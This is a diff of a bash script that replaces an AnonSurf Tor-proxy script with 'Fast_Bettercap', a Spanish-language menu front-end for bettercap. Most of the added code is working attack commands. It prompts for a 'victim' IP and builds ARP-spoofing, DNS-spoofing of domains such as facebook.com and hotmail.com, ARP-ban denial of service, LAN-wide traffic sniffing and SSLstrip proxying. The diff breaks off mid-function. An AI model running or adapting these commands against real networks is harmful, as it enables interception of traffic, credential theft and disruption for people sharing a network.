@@ -1,302 +1,438 @@
 #!/bin/bash
-
-### BEGIN INIT INFO
-# Provides:          anonsurf
-# Required-Start:
-# Required-Stop:
-# Should-Start:
-# Default-Start:
-# Default-Stop:
-# Short-Description: Transparent Proxy through TOR.
-### END INIT INFO
-#
-# Devs:
-# Lorenzo 'Palinuro' Faletra <palinuro@parrotsec.org>
-# Lisetta 'Sheireen' Ferrero <sheireen@autistiche.org>
-# Francesco 'Mibofra' Bonanno <mibofra@parrotsec.org>
-#
-# Extended:
-# Daniel 'Sawyer' Garcia <dagaba13@gmail.com>
-#
-# anonsurf is free software: you can redistribute it and/or
-# modify it under the terms of the GNU General Public License as
-# published by the Free Software Foundation, either version 3 of the
-# License, or (at your option) any later version.
-# You can get a copy of the license at www.gnu.org/licenses
-#
-# anonsurf is distributed in the hope that it will be
-# useful, but WITHOUT ANY WARRANTY; without even the implied warranty of
-# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
-# General Public License for more details.
-#
-# You should have received a copy of the GNU General Public License
-# along with Parrot Security OS. If not, see <http://www.gnu.org/licenses/>.
+#Fast_Bettercap es un script en bash que busca simplificar el uso del nuevo bettercap para aquellas personas que no saben como utilizarla.
+#No busco robarme el crédito de esta maravillosa herramienta llamada BETTERCAP, simplemente facilitar su uso.
+#Esta es la version 0.6 y estoy re diseñando las funciones y menú de selección para hacerlo mas completo.
+#No soy un programador, ni me considero un hacker, solo soy un entusiasta de informatica.
+#Por si quieren contactarme: hablemosdehacking@gmail.com
+#Acepto sugerencias y criticas.
+#John-Wick
 
 
 
-
-
-
-
-export BLUE='\033[1;94m'
-export GREEN='\033[1;92m'
-export RED='\033[1;91m'
-export RESETCOLOR='\033[1;00m'
-
-
-# Destinations you don't want routed through Tor
-TOR_EXCLUDE="192.168.0.0/16 172.16.0.0/12 10.0.0.0/8"
-
-# The UID Tor runs as
-# change it if, starting tor, the command 'ps -e | grep tor' returns a different UID
-TOR_UID="debian-tor"
-
-# Tor's TransPort
-TOR_PORT="9040"
-
-
-
-
-
-
-
-
-
-function notify {
-	if [ -e /usr/bin/notify-send ]; then
-		/usr/bin/notify-send "AnonSurf" "$1"
-	fi
-}
-export notify
-
-
-function init {
-	echo -e -n "$BLUE[$GREEN*$BLUE] $RED Matando aplicaciones peligrosas.\n"
-	sudo killall -q chrome dropbox iceweasel skype icedove thunderbird firefox firefox-esr chromium xchat hexchat transmission steam firejail
-	echo -e -n "$BLUE[$GREEN*$BLUE] $GREEN Aplicaciones peligrosas matadas..\n"
-	notify "Aplicaciones peligrosas matadas"
-
-	echo -e -n "$BLUE[$GREEN*$BLUE] $RED Limpieza de algunos elementos de caché peligrosos.\n"
-	bleachbit -c adobe_reader.cache chromium.cache chromium.current_session chromium.history elinks.history emesene.cache epiphany.cache firefox.url_history flash.cache flash.cookies google_chrome.cache google_chrome.history  links2.history opera.cache opera.search_history opera.url_history &> /dev/null
-	echo -e -n "$BLUE[$GREEN*$BLUE] $GREEN Cache Limpiada..\n"
-	notify "Cache limpiada"
+BANNER() {
+	clear;echo;
+echo -e '\e[1;33m   -::-.`                                                   `...`     \e[0m'
+echo -e '\e[1;33m  .shhhhhhyo/-`           \e[1;37mFast Bettercap V0.8\e[1;33m          .:+syhhhhhs.  \e[0m'
+echo -e '\e[1;33m `yhhhhhhhhhhhys+-`         \e[1;37m By:> John-Wick\e[1;33m        .:+syhhhhhhhhhhhs;\e[0m'
+echo -e '\e[1;33m :hhhhhhhhhhhhhhhhhyo/-.                     `.:+oyhhhhhhhhhdhhhhhhh- \e[0m'
+echo -e '\e[1;33m +hhhhhh\e[1;37mMMMMNN\e[1;33mmdhhhhhhhhyso+/:--.......-:/+oyyhhhhhhhhdm\e[1;37mNMMMMM\e[1;33mmhhhhh/ \e[0m'
+echo -e '\e[1;33m /hhhhhhd\e[1;37mNMMMMMMMN\e[1;33mmdhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhm\e[1;37mNMMMMMMMMN\e[1;33mhhhhhh/ \e[0m'
+echo -e '\e[1;33m -hhhhhhhhhdm\e[1;37mNMMMMMMMN\e[1;33mdhhhhhhhhhhhhhhhhhhhhhhhhdm\e[1;37mMMMMMMMNN\e[1;33mmdhhhhhhhh- \e[0m'
+echo -e '\e[1;33m  shhhhhhhhhhhhhhhdddd\e[1;37mmm\e[1;33mdhhhhhhhhhhhhhhhhhhhhh\e[1;37mmmm\e[1;33mdddhhhhhhhhhhhhhhhs  \e[0m'
+echo -e '\e[1;33m  `yhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhy`  \e[0m'
+echo -e '\e[1;33m   `oyhhhhhhhhhhhhhhhhhhhhhhhyyyyssssyyyyhhhhhhhhhhhhhhhhhhhhhhhyo`   \e[0m'
+echo -e '\e[1;33m     .:+ooooo++++///::--...``            ``...--:://+++oooooo+/:.     \e[0m'
+echo -e '\e[1;33m                                ``.```  \e[0m';echo;
 }
 
+DEPENDENCIAS() {
+clear;echo;echo -e "\e[30;48;5;82m[[[ Fast_Bettercap V0.8 ]]]\e[0m";echo;sleep 0.2
+if [ -f /root/bettercap.history ]; then
+	sudo rm /root/bettercap.history 2> /dev/null
+fi
 
-function ip {
+if ! hash bettercap 2>/dev/null; then
+		echo -e "\e[0;34m[[[\e[1;37mBettercap\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
+		exit
+	else
+        echo -e "\e[0;34m[[[\e[1;37mBettercap\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
+fi
 
-	MYIP=`wget -qO- https://start.parrotsec.org/ip/`
-	echo -e "\nMi ip es:\n"
-	echo $MYIP
-	echo -e "\n"
-	notify "Mi IP es:\n\n$MYIP"
+if ! hash gnome-terminal 2>/dev/null; then
+		echo -e "\e[0;34m[[[\e[1;37mGnome-terminal\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
+		exit
+	else
+        echo -e "\e[0;34m[[[\e[1;37mGnome-terminal\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
+fi
+
+if ! hash netdiscover 2>/dev/null; then
+		echo -e "\e[0;34m[[[\e[1;37mNetdiscover\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
+		exit 
+	else
+        echo -e "\e[0;34m[[[\e[1;37mNetdiscover\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
+fi
+
+if ! hash nmap 2>/dev/null; then
+		echo -e "\e[0;34m[[[\e[1;37mNmap\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
+		exit
+	else
+        echo -e "\e[0;34m[[[\e[1;37mNmap\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
+fi
+
+if ! hash dnsspoof 2>/dev/null; then
+		echo -e "\e[0;34m[[[\e[1;37mdnsspoof\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
+		exit
+	else
+        echo -e "\e[0;34m[[[\e[1;37mdnsspoof\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
+    fi
+
+if ! hash arpspoof 2>/dev/null; then
+		echo -e "\e[0;34m[[[\e[1;37marpspoof\e[0;34m]]]\e[0;31m No instalado.\e[0m";sleep 0.3
+		exit
+	else
+        echo -e "\e[0;34m[[[\e[1;37marpspoof\e[0;34m]]]\e[0;37m...\e[0;32mOK!\e[0m" ;sleep 0.3
+fi
+MENU_PRINCIPAL
 }
 
-
-function start {
-	clear
-	# Make sure only root can run this script
-	ME=$(whoami | tr [:lower:] [:upper:])
-	if [ $(id -u) -ne 0 ]; then
-		echo -e -e "\n$GREEN[$RED!$GREEN] $RED $ME R U DRUNK?? This script must be run as root$RESETCOLOR\n" >&2
-		exit 1
-	fi
-
-	echo -e "\n$BLUE[$GREEN i$BLUE ]$GREEN Iniciando el modo anónimo:$RESETCOLOR\n"
-
-	if [ ! -e /tmp/tor.pid ]; then
-		echo -e " $GREEN*$RED Tor no está corriendo! $GREEN Iniciando tor para ti.." >&2
-		echo -e -n "\n $GREEN*$RED Deteniendo el servicio nscd"
-		service nscd stop 2>/dev/null || sleep 0.3 ;echo " (Detenido)"
-		echo -e -n "\n $GREEN*$RED Deteniendo el servicio resolvconf"
-		service resolvconf stop 2>/dev/null || sleep 0.3 ;echo " (Detenido)"
-		echo -e -n "\n $GREEN*$RED Deteniendo el servicio dnsmasq"
-		service dnsmasq stop 2>/dev/null || sleep 0.3 ;echo " (Detenido)"
-		killall dnsmasq nscd resolvconf 2>/dev/null || true
-		sleep 2
-		killall -9 dnsmasq 2>/dev/null || true
-		systemctl start tor
-		sleep 3
-	fi
-
-
-	if ! [ -f /etc/network/iptables.rules ]; then
-		iptables-save > /etc/network/iptables.rules
-		echo -e "\n $BLUE*$GREEN Reglas de iptables guardadas\n"
-	fi
-
-	iptables -F
-	iptables -t nat -F
-
-	mv /etc/resolv.conf /etc/resolv.conf.bak
-	echo -e 'nameserver 127.0.0.1\nnameserver 139.99.96.146\nnameserver 37.59.40.15\nnameserver 185.121.177.177' > /etc/resolv.conf
-	echo -e " $BLUE*$GREEN Se modificó resolv.conf para usar Tor y ParrotDNS / OpenNIC\n"
-
-	# disable ipv6
-	echo -e " $BLUE*$RED Deshabilitando IPv6 por razones de seguridad\n"
-	sysctl -w net.ipv6.conf.all.disable_ipv6=1
-	sysctl -w net.ipv6.conf.default.disable_ipv6=1
-
-	# set iptables nat
-	echo;echo -e " $BLUE*$GREEN Configurando las reglas de iptables para enrutar todo el tráfico a través de tor\n"
-	iptables -t nat -A OUTPUT -m owner --uid-owner $TOR_UID -j RETURN
-
-	#set dns redirect
-	echo -e " $BLUE*$GREEN Redireccionando el tráfico DNS a través de tor\n"
-	iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 53
-	iptables -t nat -A OUTPUT -p tcp --dport 53 -j REDIRECT --to-ports 53
-	iptables -t nat -A OUTPUT -p udp -m owner --uid-owner $TOR_UID -m udp --dport 53 -j REDIRECT --to-ports 53
-
-	#resolve .onion domains mapping 10.192.0.0/10 address space
-	iptables -t nat -A OUTPUT -p tcp -d 10.192.0.0/10 -j REDIRECT --to-ports $TOR_PORT
-	iptables -t nat -A OUTPUT -p udp -d 10.192.0.0/10 -j REDIRECT --to-ports $TOR_PORT
-
-	#exclude local addresses
-	for NET in $TOR_EXCLUDE 127.0.0.0/9 127.128.0.0/10; do
-		iptables -t nat -A OUTPUT -d $NET -j RETURN
-		iptables -A OUTPUT -d "$NET" -j ACCEPT
+SAVECAPTURE() {
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+	read SINO
+	while [[ -z "$SINO" ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio.\e[0m";
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea guarda los paquetes capturados en un archivo (si/no) :> \e[0m"; tput sgr0
+		read SINO
 	done
+}
 
-	#redirect all other output through TOR
-	iptables -t nat -A OUTPUT -p tcp --syn -j REDIRECT --to-ports $TOR_PORT
-	iptables -t nat -A OUTPUT -p udp -j REDIRECT --to-ports $TOR_PORT
-	iptables -t nat -A OUTPUT -p icmp -j REDIRECT --to-ports $TOR_PORT
+FILEPATH() {
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+	read SALIDA_FAST_BETTERCAP
+		while [[ -z "$SALIDA_FAST_BETTERCAP"  ]] || [[ ! -d "$SALIDA_FAST_BETTERCAP" ]]; do 
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o el directorio no existe..\e[0m" 
+				echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ruta donde guardar la captura :> \e[0m"; tput sgr0
+				read SALIDA_FAST_BETTERCAP
+		done
+}
 
-	#accept already established connections
-	iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+SET_TARGET() {
+	sleep 2 &
+PID=$!
+i=1
+sp="/-\|"
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Buscando interfaces disponibles.. \e[0m" $(echo -e "\e[0;31m  "  )
+while [ -d /proc/$PID ]
+		do
+			sleep 0.1
+			printf "\b${sp:i++%${#sp}:1}"
+done
+	echo; echo -e "\e[0;33m ";  iwconfig 2>&1 | grep 802.11 | awk '{print "* "$1," <-------->  "$4,$5,$6,$7}'
+	echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar:> \e[0m"; tput sgr0
+	read INTERFACE
+	INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
+	while [ -z "$INTERFACE" -o "$INTERFACES" != "$INTERFACE" ]; do
+		echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio, o la interfaz no esta disponible..\e[0m";
+		echo; echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Escriba la interfaz a utilizar:> \e[0m"; tput sgr0
+		read INTERFACE
+		INTERFACES=`airmon-ng|grep ''"$INTERFACE"|cut -f2`
+	done
+}
 
-	#allow only tor output
-	echo -e " $BLUE*$GREEN Permitiendo solo navegar en red clara\n"
-	iptables -A OUTPUT -m owner --uid-owner $TOR_UID -j ACCEPT
-	iptables -A OUTPUT -j REJECT
+HOSTUPBETTERCAP() {
+	SET_TARGET
+	gnome-terminal -t Bettercap Network Devices --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; ticker on " && clear; MENU_PRINCIPAL;
+}
+ 
+HOSTUPNETDISCOVER() {
+	SET_TARGET;
+	echo -e "\e[0;32m " | gnome-terminal -t Netdiscover Network Devices --geometry=100x30 --zoom=1 -- netdiscover -i $INTERFACE && clear; MENU_PRINCIPAL;
+}
 
-	echo -e "$BLUE *$GREEN Todo el tráfico fue redirigido a través de Tor.\n"
-	echo -e "$BLUE[$GREEN i$BLUE ]$GREEN Estás bajo el túnel de AnonSurf.$RESETCOLOR\n"
-	notify "Proxy anónimo global activado"
-	sleep 1
-	notify "Baila como si nadie estuviese mirando :)"
-	sleep 1
+HOST_UP() {
+	echo;echo -e "\e[0;34m[[[\e[1;32m0. \e[0;34m]]]\e[0;37m Bettercap\e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m1. \e[0;34m]]]\e[0;37m Netdiscover\e[0m"
+	echo -e "\e[0;34m[[[\e[1;32m2. \e[0;34m]]]\e[0;37m Menu principal\e[0m"
+	echo -e "\e[0;34m[[[\e[1;31m99.\e[0;34m]]]\e[0;37m Salir\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Betteacp_Network_Devices:> \e[0m"; tput sgr0
+	read HOSTUPOPCION
+while [[ -z "$HOSTUPOPCION" || "$HOSTUPOPCION" != @(0|1|2|99|) ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo esta vacio, o la \"opcion\" no corresponde al menu.\e[0m";echo
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Network_Devices:> \e[0m"; tput sgr0
+		read HOSTUPOPCION
+done
+		while true;do
+				case $HOSTUPOPCION in
+					0) HOSTUPBETTERCAP
+					;;
+					1) HOSTUPNETDISCOVER
+					;;
+					2) MENU_PRINCIPAL
+					;;
+					99) exit
+					;;
+				esac
+		done
+}
+
+ARPSPOOFDNSSPOOF() {
+SET_TARGET;
+GT=$(netstat -rn | egrep "$INTERFACE"| awk '{print $2}'|grep 192)
+
+echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m ArpSpoof & DnsSpoof. \e[0m";
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ip de la victima:> \e[0m"; tput sgr0
+read IPVICTIMA
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Su gateway ($GT):> \e[0m"; tput sgr0
+read GATEWAY
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
+read IPDIRECTION
+while [[ -z "$IPVICTIMA" || -z "$GATEWAY" || -z "$IPDIRECTION" ]]; do
+		echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado uno de los dos campos vacio, vuelva a intentarlo..\e[0m" 
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ip de la victima:> \e[0m"; tput sgr0
+		read IPVICTIMA
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Su gateway ($GT):> \e[0m"; tput sgr0
+		read GATEWAY
+		echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
+		read IPDIRECTION
+done
+
+
 }
 
 
-function stop {
-	# Make sure only root can run our script
-	ME=$(whoami | tr [:lower:] [:upper:])
 
-	if [ $(id -u) -ne 0 ]; then
-		echo -e "\n$GREEN[$RED!$GREEN] $RED $ME R U DRUNK?? This script must be run as root$RESETCOLOR\n" >&2
-		exit 1
-	fi
+BETTERCAP() { 
+	SET_TARGET;
+	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede suplantar varios dominios separados por \",\" Ejem: facebook.com, hotmail.com \e[0m";
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que dominios desea suplantar:> \e[0m"; tput sgr0
+	read DOMAINOPCION
+	DO=$DOMAINOPCION
+		while [[ -z "$DOMAINOPCION"  ]]; do 
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
+				echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que dominios desea suplantar:> \e[0m"; tput sgr0
+				read DOMAINOPCION
+		done
+IPDEFUAL=$(hostname -I)
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS ($IPDEFUAL):> \e[0m"; tput sgr0
+read IPDIRECTION
+IP=$IPDIRECTION
+while [[ -z "$IPDIRECTION" ]]; do
+	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m"
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m A que direccion ip se enviara la consulta DNS:> \e[0m"; tput sgr0
+	read IPDIRECTION
+done
+	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;32m DNS.SPOOF-ALL:\e[0;37m si es verdadero, el módulo responderá a cada solicitud DNS\e[0m"
+	echo -e "\e[0;37m de lo contrario, solo responderá a la que apunta a la PC local.\e[0m";
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Dns spoof all (false/true):> \e[0m"; tput sgr0
+	read SPOOFALL
+	TF=$SPOOFALL
+		while [[ -z "$SPOOFALL" || "$SPOOFALL" != @(false|true|) ]]; do
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio o no escribio bien (false/true)\e[0m"
+				echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Dns spoof all (false/true):> \e[0m"; tput sgr0
+				read SPOOFALL
+		done
+echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea lanzar dns.spoof al toda la red(si/no):> "; tput sgr0
+	read TARGETOPCION
+while [[ -z "$TARGETOPCION" || "$TARGETOPCION" != @(si|no|) ]]; do
+	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio o no escribio bien (si/no)\e[0m"
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea lanzar dns.spoof al toda la red(si/no):> "; tput sgr0
+	read TARGETOPCION
+done
+		 case $TARGETOPCION in
+			[si]* ) gnome-terminal -t "DNS SPOOF" --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "set dns.spoof.domains $DO; set dns.spoof.address $IP; set dns.spoof.all $TF" -autostart  "dns.spoof, arp.spoof, events.stream " && clear;MENU_PRINCIPAL;
+			;;
+			[no]* ) echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede agregar mas de una direccion ip separadas por \",\" Ejemplo: 192.X.X.X, 192.X.X.X\e[0m"
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que ip desea agregar:> "; tput sgr0
+	read IPARPOPCION
+while [[ -z "$IPARPOPCION" ]]; do
+	echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo vacio..\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Que ip desea agregar:> "; tput sgr0
+	read IPARPOPCION
+done
+			gnome-terminal -t "DNS SPOOF" --geometry=170x35 --zoom=1 -- bettercap -iface $INTERFACE -eval "set dns.spoof.domains $DO; set dns.spoof.address $IP; set dns.spoof.all $TF; set arp.spoof.targets $IPARPOPCION" -autostart  "dns.spoof, arp.spoof, events.stream" && clear;MENU_PRINCIPAL;
+			;;	
+			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/no\e[0m";
+			;;
+	esac
+}
 
-	echo -e "\n$BLUE[$RED i$BLUE ]$RED Deteniendo el modo anónimo:$RESETCOLOR\n"
+BAN_TARGET() {
+	SET_TARGET;
+	sleep 0.5 ;echo;
+	echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Puede banear mas de un objetivo. Ejemplo: 192.X.X.X,192.X.X.X\e[0m"
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
+	read TARGETS
+		while [[ -z "$TARGETS" ]]; do
+			   echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m El campo \"target_ban\" esta vacio.\e[0m";echo;
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Fast_Bettercap_Target_Ban:> \e[0m"; tput sgr0
+			   read TARGETS
+		done
+	gnome-terminal -t "Baneando a: -----> $TARGETS" --geometry=68x6 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval 'arp.ban on; set arp.spoof.targets $TARGETS; set ticker.commands "clear; !echo "ARP en el modo de prohibición..""; set ticker.period 1' "-autostart ticker, arp.spoof" && clear;MENU_PRINCIPAL;
+}
 
-	iptables -F
-	iptables -t nat -F
-	echo -e "\n $BLUE*$RED Eliminado todas las reglas de iptables"
+SNIFFALL() { 				
+SET_TARGET;SAVECAPTURE
+	 case $SINO in
+			[s]* ) FILEPATH;
+					gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; net.sniff on; arp.spoof on; events.clear" && clear; MENU_PRINCIPAL;
+			;;
+			[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.sniff on; arp.spoof on; events.clear" && clear; MENU_PRINCIPAL;
+			;;	
+			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
+			;;
+	esac
+}
 
-	if [ -f /etc/network/iptables.rules ]; then
-		iptables-restore < /etc/network/iptables.rules
-		rm /etc/network/iptables.rules
-		echo -e "\n $BLUE*$GREEN Reglas de iptables restauradas "
-	fi
-	echo -e -n "\n $BLUE*$GREEN Restaurar el servicio de DNS";echo;
-	if [ -e /etc/resolv.conf.bak ]; then
-		rm /etc/resolv.conf
-		mv /etc/resolv.conf.bak /etc/resolv.conf
-	fi
+SNIFFTARGET() {
+	SET_TARGET;SAVECAPTURE;
+	 case $SINO in
+			[s]* ) 	FILEPATH;
+					echo;echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 1: 192.168.1.2-4 (rango)\e[0m"
+					echo -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Ejemplo 2 192.168.1.3,192.168.1.5 (objetivos especificos)\e[0m";echo;
+					echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
+	 				read SNIFFTARGETOPCION
+					while [[ -z "$SNIFFTARGETOPCION"  ]]; do 
+							echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Usted ha dejado el campo vacio...\e[0m" 
+							echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Objetivo/s:> \e[0m"; tput sgr0
+							read SNIFFTARGETOPCION
+					done
+							gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets $SNIFFTARGETOPCION; arp.spoof on; set net.sniff.output $SALIDA_FAST_BETTERCAP/sniff_all.pcap; set net.sniff.verbose false; net.sniff on"&& clear; MENU_PRINCIPAL;
 
-	# re-enable ipv6
-	echo ;
-	sysctl -w net.ipv6.conf.all.disable_ipv6=0
-	sysctl -w net.ipv6.conf.default.disable_ipv6=0
-	echo;
+			;;
+		[n]* ) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -iface $INTERFACE -eval "net.probe on; set arp.spoof.targets; arp.spoof on; set net.sniff.verbose false; net.sniff on "&& clear; MENU_PRINCIPAL;
+			;;	
+			* ) echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;37m Solo escriba si/s/ no/n\e[0m";
+			;;
+	esac
+}
 
-	service tor stop
-	sleep 2
-	killall tor 2> /dev/null
-	sleep 2
-	echo -e -n "$BLUE *$GREEN Reiniciando servicios..\n"
-	service resolvconf start || service resolvconf restart || true
-	service dnsmasq start 2> /dev/null
-	service nscd start 2> /dev/null
-	echo -e " $BLUE*$GREEN No preocuparse por los errores de inicio de dnsmasq y nscd si aún no están instalados o iniciados."
-	sleep 1
+SNIFFLOCAL() {
+	gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- bettercap -eval "set net.sniff.local true; events.clear; net.sniff on; arp.spoof on" && clear; MENU_PRINCIPAL;
 
-	echo -e " $BLUE*$GREEN Modo anónimo detenido\n"
-	notify "Proxy Anónimo Global Cerrado - Deja de bailar :("
-	sleep 2
+}
+
+SSLSTRIPONOFF() {
+	echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
+	read SSLTRIPOPCION
+		while [[ -z "$SSLTRIPOPCION"  ]]; do 
+				echo -e "\e[0;34m[[[\e[1;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
+				echo;echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
+				read SSLTRIPOPCION
+		done
 }
 
 
-function change {
-	exitnode-selector
-	sleep 5
-	echo -e " $BLUE*$GREEN Tor daemon recargado y forzado a cambiar nodos.\n"
-	notify "Identidad cambiada, bailemos de nuevo.!"
-	sleep 1
+HTTPPROXY() {
+SET_TARGET;SAVECAPTURE;
+	 case $SINO in
+			[s]* ) FILEPATH;SSLSTRIPONOFF
+							case $SSLTRIPOPCION in
+									[s]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false; set http.proxy.sslstrip true" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
+									;;
+									[n]*) gnome-terminal -t sniff_all --geometry=190x40 --zoom=1 -- sudo bettercap -iface $INTERFACE -eval "set arp.spoof.targets; set net.sniff.output $HTTPPROXYOPCION/http_sslstrip.pcap; set net.sniff.verbose false" -autostart "arp.spoof, events.stream, http.proxy, net.recon, net.sniff,"  && clear;MENU_PRINCIPAL;
+									;;
+								 	*) echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Solo escriba si/s/ no/n\e[0m";SSLSTRIPONOFF;
+									;;
+							esac
+			;;
+		[n]* )  echo -n -e "\e[0;34m[[[\e[1;32m>>\e[0;34m]]]\e[0;37m Desea utilizar sslstrip (si/no):> \e[0m"; tput sgr0
+	 			read SSLTRIPOPCION
+					while [[ -z "$SSLTRIPOPCION"  ]]; do 
+							echo -e "\e[0;34m[[[\e[0;31m>>\e[0;34m]]]\e[0;31m Usted ha dejado el campo vacio...\e[0m" 
